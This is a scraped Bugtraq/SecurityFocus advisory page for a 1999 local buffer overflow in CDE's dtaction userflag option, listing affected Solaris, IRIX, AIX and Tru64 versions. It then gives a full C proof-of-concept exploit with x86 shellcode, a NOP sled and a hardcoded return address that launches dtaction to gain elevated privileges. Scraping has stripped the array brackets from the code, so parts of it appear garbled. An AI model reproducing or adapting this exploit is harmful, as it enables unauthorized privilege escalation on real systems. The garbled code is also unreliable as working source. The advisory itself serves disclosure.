<p><b><span style="font-size: 18pt;">Multiple Vendor CDE dtaction Userflag Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/635/info">info</a><br><a href="http://www.securityfocus.com/bid/635/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/635/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/635/solution">solution</a><br><a href="http://www.securityfocus.com/bid/635/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				635
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Sep 13 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Sep 13 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was discovered and posted to the Bugtraq mailing list by Job de Haas of ITSX (Information Technology Security eXperts) on Mon Sep 13 1999.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun Solaris 2.5.1 _x86<br/>
					
				
					Sun Solaris 2.5.1 <br/>
					
				
					Sun Solaris  7.0_x86<br/>
					
				
					Sun Solaris  7.0<br/>
					
				
					Sun Solaris  2.6<br/>
					
				
					Sun Solaris  2.5<br/>
					
				
					Sun Solaris  2.4_x86<br/>
					
				
					Sun Solaris  2.4<br/>
					
				
					SGI IRIX 6.5.14 <br/>
					
				
					SGI IRIX 6.5.13 m<br/>
					
				
					SGI IRIX 6.5.13 f<br/>
					
				
					SGI IRIX 6.5.13 <br/>
					
				
					SGI IRIX 6.5.12 m<br/>
					
				
					SGI IRIX 6.5.12 f<br/>
					
				
					SGI IRIX 6.5.12 <br/>
					
				
					SGI IRIX 6.5.11 m<br/>
					
				
					SGI IRIX 6.5.11 f<br/>
					
				
					SGI IRIX 6.5.11 <br/>
					
				
					SGI IRIX 6.5.10 m<br/>
					
				
					SGI IRIX 6.5.10 f<br/>
					
				
					SGI IRIX 6.5.10 <br/>
					
				
					SGI IRIX 6.5.9 m<br/>
					
				
					SGI IRIX 6.5.9 f<br/>
					
				
					SGI IRIX 6.5.9 <br/>
					
				
					SGI IRIX 6.5.8 m<br/>
					
				
					SGI IRIX 6.5.8 f<br/>
					
				
					SGI IRIX 6.5.8 <br/>
					
				
					SGI IRIX 6.5.7 m<br/>
					
				
					SGI IRIX 6.5.7 f<br/>
					
				
					SGI IRIX 6.5.7 <br/>
					
				
					SGI IRIX 6.5.6 m<br/>
					
				
					SGI IRIX 6.5.6 f<br/>
					
				
					SGI IRIX 6.5.6 <br/>
					
				
					SGI IRIX 6.5.5 m<br/>
					
				
					SGI IRIX 6.5.5 f<br/>
					
				
					SGI IRIX 6.5.5 <br/>
					
				
					SGI IRIX 6.5.4 m<br/>
					
				
					SGI IRIX 6.5.4 f<br/>
					
				
					SGI IRIX 6.5.4 <br/>
					
				
					SGI IRIX 6.5.3 m<br/>
					
				
					SGI IRIX 6.5.3 f<br/>
					
				
					SGI IRIX 6.5.3 <br/>
					
				
					SGI IRIX 6.5.2 m<br/>
					
				
					SGI IRIX 6.5.2 f<br/>
					
				
					SGI IRIX 6.5.2 <br/>
					
				
					SGI IRIX 6.5.1 <br/>
					
				
					SGI IRIX 6.5 <br/>
					
				
					Open Group CDE Common Desktop Environment 2.1 <br/>
<span class="related">
						
							+ 
						
						Sun Solaris  9_x86 Update 2<br/>
</span>
<span class="related">
						
							+ 
						
						Sun Solaris  9_x86<br/>
</span>
<span class="related">
						
							+ 
						
						Sun Solaris  9<br/>
</span>
					
				
					Open Group CDE Common Desktop Environment 2.0 <br/>
					
				
					Open Group CDE Common Desktop Environment 1.2 <br/>
					
				
					Open Group CDE Common Desktop Environment 1.1 <br/>
					
				
					Open Group CDE Common Desktop Environment 1.0.2 <br/>
					
				
					Open Group CDE Common Desktop Environment 1.0.1 <br/>
					
				
					IBM AIX 4.3.2 <br/>
					
				
					IBM AIX 4.3.1 <br/>
					
				
					IBM AIX 4.3 <br/>
					
				
					IBM AIX 4.2.1 <br/>
					
				
					IBM AIX 4.2 <br/>
					
				
					Digital (Compaq) TRU64/DIGITAL UNIX 4.0 f<br/>
					
				
					Digital (Compaq) TRU64/DIGITAL UNIX 4.0 e<br/>
					
				
					Digital (Compaq) TRU64/DIGITAL UNIX 4.0 d<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	/*<br/> * dtaction_ov.c<br/> * Job de Haas<br/> * (c) ITSX bv 1999<br/> *<br/> * This program demonstrates an overflow problem in /usr/dt/bin/dtaction.<br/> * It has only been tested on Solaris 7 x86<br/> * assembly code has been taken from ex_dtprintinfo86.c by unewn4th@usa.net<br/> *<br/> */<br/><br/>#include &lt;stdio.h&gt;<br/><br/>#include &lt;stdlib.h&gt;<br/>#include &lt;string.h&gt;<br/>#include &lt;pwd.h&gt;<br/><br/>#define BUFLEN 998<br/><br/>char exploit_code =<br/>"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"<br/>"\x8d\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"<br/>"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"<br/>"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"<br/>"\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33"<br/>"\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88"<br/>"\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f"<br/>"\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46"<br/>"\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01"<br/>"\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/id";<br/><br/>main()<br/>{<br/>    char *argp6, *envp3;<br/>    char buf2048;<br/>    unsigned long *p;<br/>    struct passwd *pw;<br/>    int buflen;<br/><br/>    if ((pw = getpwuid(getuid())) == NULL) {<br/>        perror("getpwuid");<br/>        exit(1);<br/>    }<br/><br/>    buflen = BUFLEN - strlen( pw-&gt;pw_name );<br/><br/>    memset(buf,0x90,buflen);<br/><br/>    strncpy( &amp;buf500, exploit_code, strlen(exploit_code));<br/><br/>    /* set some pointers to values that keep code running */<br/>    p = (unsigned long *)&amp;bufbuflen;<br/>    *p++ = 0x37dc779b;<br/>    *p++ = 0xdfaf6502;<br/>    *p++ = 0x08051230;<br/>    *p++ = 0x080479b8;<br/><br/>    /* the return address. */<br/>    *p++ = 0x08047710;<br/>    *p = 0;<br/><br/>    argp0 = strdup("/usr/dt/bin/dtaction");<br/>    argp1 = strdup("-u");<br/>    argp2 = strdup(buf);<br/>    argp3 = strdup("Run");<br/>    argp4 = strdup("/usr/bin/id");<br/>    argp5 = NULL;<br/><br/>    if (!getenv("DISPLAY")) {<br/>        printf("forgot to set DISPLAY\n");<br/>        exit(1);<br/>    }<br/><br/>    envp0 = malloc( strlen("DISPLAY=")+strlen(getenv("DISPLAY"))+1);<br/>    strcpy(envp0,"DISPLAY=");<br/>    strcat(envp0,getenv("DISPLAY"));<br/>    envp1 = NULL;<br/><br/>    execve("/usr/dt/bin/dtaction",argp,envp);<br/><br/>}
	
		<ul>
</ul>
</div>